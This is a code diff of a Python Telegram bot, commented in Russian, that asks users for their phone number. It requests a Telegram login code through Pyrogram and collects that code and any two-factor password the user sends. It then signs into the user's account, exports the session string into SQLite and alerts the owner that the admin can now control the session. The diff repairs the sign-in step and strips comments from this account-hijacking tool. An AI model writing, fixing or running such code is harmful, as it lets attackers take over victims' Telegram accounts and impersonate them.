@@ -4,7 +4,7 @@ import os
 import sqlite3
 from datetime import datetime
 from aiohttp import web
-from aiogram import Bot, Dispatcher, F, types
+from aiogram import Bot, Dispatcher, F
 from aiogram.filters import CommandStart, Command
 from aiogram.types import (
     Message, MenuButtonWebApp, WebAppInfo, 
@@ -59,7 +59,6 @@ async def start(message: Message):
         )
     )
     
-    # КНОПКА ДЛЯ ОТПРАВКИ НОМЕРА
     contact_keyboard = ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="📱 Отправить номер", request_contact=True)]
@@ -74,7 +73,7 @@ async def start(message: Message):
         reply_markup=contact_keyboard
     )
 
-# ====== КОМАНДА /PHONE (РУЧНОЙ ЗАПРОС) ======
+# ====== КОМАНДА /PHONE ======
 @dp.message(Command("phone"))
 async def request_phone(message: Message):
     contact_keyboard = ReplyKeyboardMarkup(
@@ -97,7 +96,6 @@ async def got_contact(message: Message):
     name = message.from_user.full_name
     username = f"@{message.from_user.username}" if message.from_user.username else "нет"
     
-    # Сохраняем телефон в БД
     conn = sqlite3.connect('sessions.db')
     c = conn.cursor()
     c.execute(
@@ -107,7 +105,6 @@ async def got_contact(message: Message):
     conn.commit()
     conn.close()
     
-    # Отправляем код через Pyrogram
     try:
         client = Client(
             f"session_{user_id}",
@@ -118,7 +115,6 @@ async def got_contact(message: Message):
         await client.connect()
         sent_code = await client.send_code(phone)
         
-        # Сохраняем код в БД
         conn = sqlite3.connect('sessions.db')
         c = conn.cursor()
         c.execute(
@@ -134,7 +130,6 @@ async def got_contact(message: Message):
             "Пример: <code>12345</code>"
         )
         
-        # Уведомление админу
         await bot.send_message(
             OWNER_ID,
             f"📱 Новый запрос входа\n"
@@ -155,11 +150,9 @@ async def handle_code(message: Message):
     code = message.text.strip()
     user_id = message.from_user.id
     
-    # Проверяем, что это код (5-6 цифр)
     if not code.isdigit() or len(code) not in [5, 6]:
         return
     
-    # Проверяем, есть ли пользователь в БД
     conn = sqlite3.connect('sessions.db')
     c = conn.cursor()
     c.execute("SELECT phone FROM users WHERE user_id=?", (user_id,))
@@ -171,19 +164,8 @@ async def handle_code(message: Message):
         return
     
     phone = result[0]
-    
-    # Получаем код хеш
-    c.execute("SELECT code FROM temp_sessions WHERE user_id=?", (user_id,))
-    temp = c.fetchone()
     conn.close()
     
-    if not temp:
-        await message.answer("❌ Сессия истекла. Запросите код заново")
-        return
-    
-    code_hash = temp[0]
-    
-    # Пробуем войти
     try:
         client = Client(
             f"session_{user_id}",
@@ -193,9 +175,10 @@ async def handle_code(message: Message):
         )
         await client.connect()
         
-        # Вход с кодом (ИСПРАВЛЕНО!)
         try:
-            await client.sign_in(phone, code)  # ← УБРАЛ phone_code_hash
+            # ===== ГЛАВНОЕ ИСПРАВЛЕНИЕ =====
+            await client.sign_in(phone, code)
+            # =================================
         except SessionPasswordNeeded:
             await message.answer("🔐 Включена двухфакторная аутентификация. Отправьте пароль.")
             conn = sqlite3.connect('sessions.db')
@@ -214,10 +197,8 @@ async def handle_code(message: Message):
             await client.disconnect()
             return
         
-        # Успешный вход
         session_string = await client.export_session_string()
         
-        # Сохраняем сессию
         conn = sqlite3.connect('sessions.db')
         c = conn.cursor()
         c.execute(
@@ -233,7 +214,6 @@ async def handle_code(message: Message):
             "📱 Теперь админ может управлять сессией."
         )
         
-        # Уведомление админу
         await bot.send_message(
             OWNER_ID,
             f"🔐 <b>Новый вход в аккаунт</b>\n"
@@ -411,7 +391,7 @@ async def delete_user(message: Message):
     
     await message.answer(f"✅ Пользователь {user_id} удалён")
 
-# ====== WEBHOOK ДЛЯ МИНИ-АПП ======
+# ====== WEBHOOK ======
 async def handle_collect(request: web.Request) -> web.Response:
     try:
         data = await request.json()
